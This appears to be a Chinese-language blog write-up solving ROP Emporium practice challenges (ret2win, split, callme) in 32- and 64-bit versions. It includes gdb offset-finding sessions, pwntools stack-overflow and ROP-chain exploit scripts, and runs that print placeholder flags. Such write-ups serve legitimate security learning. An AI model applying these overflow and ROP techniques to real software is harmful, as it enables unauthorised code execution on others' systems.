---
title: ROP_Emporium(更新中...)
date: 2018-03-17 22:22:11
tags: PWN

---

# ret2win32 Write up

## 0x00 前言

群里大佬发的网站，花点时间做下

<!--more-->

## 0x01 源码分析

```
char *pwnme()
{
  char s; // [sp+0h] [bp-28h]@1

  memset(&s, 0, 32u);
  puts("For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?");
  puts("You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n");
  printf("> ");
  return fgets(&s, 50, stdin);
}
```

简单的栈溢出，gdb调试
​    

```
mask@mask-virtual-machine:~/ROP_Emporium/ret2win32$ gdb ./ret2win32 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ret2win32...(no debugging symbols found)...done.
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/mask/ROP_Emporium/ret2win32/ret2win32 
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xbffff010 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
EBX: 0x0 
ECX: 0x0 
EDX: 0xb7fbb87c --> 0x0 
ESI: 0xb7fba000 --> 0x1b1db0 
EDI: 0xb7fba000 --> 0x1b1db0 
EBP: 0x41304141 ('AA0A')
ESP: 0xbffff040 --> 0xb7fb0062 --> 0xe65400e 
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xbffff040 --> 0xb7fb0062 --> 0xe65400e 
0004| 0xbffff044 --> 0xbffff060 --> 0x1 
0008| 0xbffff048 --> 0x0 
0012| 0xbffff04c --> 0xb7e20637 (<__libc_start_main+247>:	addesp,0x10)
0016| 0xbffff050 --> 0xb7fba000 --> 0x1b1db0 
0020| 0xbffff054 --> 0xb7fba000 --> 0x1b1db0 
0024| 0xbffff058 --> 0x0 
0028| 0xbffff05c --> 0xb7e20637 (<__libc_start_main+247>:	addesp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
gdb-peda$ q
```

然后需要跳转的地址为`0x8048659`
​    

```
.text:08048659 ret2win proc near
.text:08048659 pushebp
.text:0804865A mov ebp, esp
.text:0804865C sub esp, 8
.text:0804865F sub esp, 0Ch
.text:08048662 pushoffset aThankYouHereSY ; "Thank you! Here's your flag:"
.text:08048667 call_printf
.text:0804866C add esp, 10h
.text:0804866F sub esp, 0Ch
.text:08048672 pushoffset command  ; "/bin/cat flag.txt"
.text:08048677 call_system
.text:0804867C add esp, 10h
.text:0804867F nop
.text:08048680 leave
.text:08048681 retn
.text:08048681 ret2win endp
```

那么偏移为44

## 0x02 编写exp

```
from pwn import*

io = process('./ret2win32')

payload = 'A'*44

payload += p32(0x8048659)

io.send(payload)

io.interactive()
```

​    

执行：
​    

```
mask@mask-virtual-machine:~/ROP_Emporium/ret2win32$ vim exp.py 
mask@mask-virtual-machine:~/ROP_Emporium/ret2win32$ python exp.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './ret2win32': pid 6385
[*] Switching to interactive mode
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> $ 
Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```



# ret2win 64

## 0x00 前言

和32位的思路一样

## 0x01 编写exp

```
from pwn import*

io = process('./ret2win')

payload = 'A'*40

payload += p64(0x400811)

io.sendline(payload)

io.interactive()
```

​    

运行：
​    

```
mask@mask-virtual-machine:~/ROP_Emporium/ret2win$ vim exp.py
mask@mask-virtual-machine:~/ROP_Emporium/ret2win$ python exp.py 
[*] Checking for new versions of pwntools
To disable this functionality, set the contents of /home/mask/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.0.dev0)
[+] Starting local process './ret2win': pid 13553
[*] Switching to interactive mode
ret2win by ROP Emporium
64bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!

> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```



# Split 32

## 0x00 前言

继续刷

## 0x01 源码分析

```
char *pwnme()
{
  char s; // [sp+0h] [bp-28h]@1

  memset(&s, 0, 32u);
  puts("Contriving a reason to ask user for data...");
  printf("> ");
  return fgets(&s, 96, stdin);
}
```

存在栈溢出，然后存在一个usefulFunction，

```
int usefulFunction()
{
  return system("/bin/ls");
}
```

但是调用的不是我们想要的`cat`，那么凭直觉，应该在其他地方，搜一下
​    

```
.data:0804A030 public usefulString
.data:0804A030 usefulStringdb '/bin/cat flag.txt',0
```

## 0x02 调试

```
mask@mask-virtual-machine:~/ROP_Emporium/split/split32$ gdb ./split32 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./split32...(no debugging symbols found)...done.
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/mask/ROP_Emporium/split/split32/split32 
split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xbffff010 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA\n")
EBX: 0x0 
ECX: 0x0 
EDX: 0xb7fbb87c --> 0x0 
ESI: 0xb7fba000 --> 0x1b1db0 
EDI: 0xb7fba000 --> 0x1b1db0 
EBP: 0x41304141 ('AA0A')
ESP: 0xbffff040 --> 0xa4162 ('bA\n')
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xbffff040 --> 0xa4162 ('bA\n')
0004| 0xbffff044 --> 0xbffff060 --> 0x1 
0008| 0xbffff048 --> 0x0 
0012| 0xbffff04c --> 0xb7e20637 (<__libc_start_main+247>:	addesp,0x10)
0016| 0xbffff050 --> 0xb7fba000 --> 0x1b1db0 
0020| 0xbffff054 --> 0xb7fba000 --> 0x1b1db0 
0024| 0xbffff058 --> 0x0 
0028| 0xbffff05c --> 0xb7e20637 (<__libc_start_main+247>:	addesp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
```

计算出了偏移为44，开始编写exp

## 0x03 编写exp

```
from pwn import*

io = process('./split32')

payload = 'A'*44

payload += p32(0x08048657) #system地址

payload += p32(0x0804A030) #参数/bin/cat地址

io.sendline(payload)

io.interactive()
```

运行：
​    

```
mask@mask-virtual-machine:~/ROP_Emporium/split/split32$ python exp.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './split32': pid 6642
[*] Switching to interactive mode
split by ROP Emporium
32bits

Contriving a reason to ask user for data...
> ROPE{a_placeholder_32byte_flag!}
```

# callme32 writeup

## 0x00 前言

我擦，这不就是之前ctf群的入群题目嘛！！！(((φ(◎ロ◎;)φ)))

## 0x01 分析

分析过程和之前那道题一样，这里直接写exp了：
​    

```
from pwn import *

# context.log_level = 'debug'

io = process("./callme32")

callme_one_plt = 0x80485c0
callme_two_plt = 0x8048620
callme_three_plt = 0x80485b0
pppr = 0x80488a9

payload = ''

payload += 'A'*44

payload += p32(callme_one_plt)

payload += p32(pppr)
payload += p32(0x1)+p32(0x2)+p32(0x3)

    

payload += p32(callme_two_plt)
payload += p32(pppr)

payload += p32(0x1)+p32(0x2)+p32(0x3)

    

payload += p32(callme_three_plt)
payload += p32(pppr)
payload += p32(0x1)+p32(0x2)+p32(0x3)

io.sendline(payload)

print io.recvall()
```

运行：
​    

```
mask@mask-virtual-machine:~/ROP_Emporium/callme32$ python exp.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Starting local process './callme32': pid 13701
[+] Receiving all data: Done (99B)
[*] Process './callme32' stopped with exit code 0 (pid 13701)
callme by ROP Emporium
32bits

Hope you read the instructions...
> ROPE{a_placeholder_32byte_flag!}
```

# callme64 writeup

既然写过的就快速过一遍，直接写exp：

```
from pwn import *

io = process("./callme")

callme_one_plt = 0x401850
callme_two_plt = 0x401870
callme_three_plt = 0x401810

pppr = 0x401ab0

payload = ''
payload += 'A'*40
payload += p64(pppr)

payload += p64(1)+p64(2)+p64(3)
payload += p64(callme_one_plt)

payload += p64(pppr)

payload +=p64(1)+p64(2)+p64(3)
payload += p64(callme_two_plt)

payload += p64(pppr)

payload +=p64(1)+p64(2)+p64(3)
payload += p64(callme_three_plt)

io.sendline(payload)

print io.recvall()
```

运行：
​    

```
mask@mask-virtual-machine:~/ROP_Emporium/callme$ python exp.py 
[+] Starting local process './callme': pid 10993
[+] Receiving all data: Done (99B)
[*] Process './callme' stopped with exit code 0 (pid 10993)
callme by ROP Emporium
64bits

Hope you read the instructions...
> ROPE{a_placeholder_32byte_flag!}
```

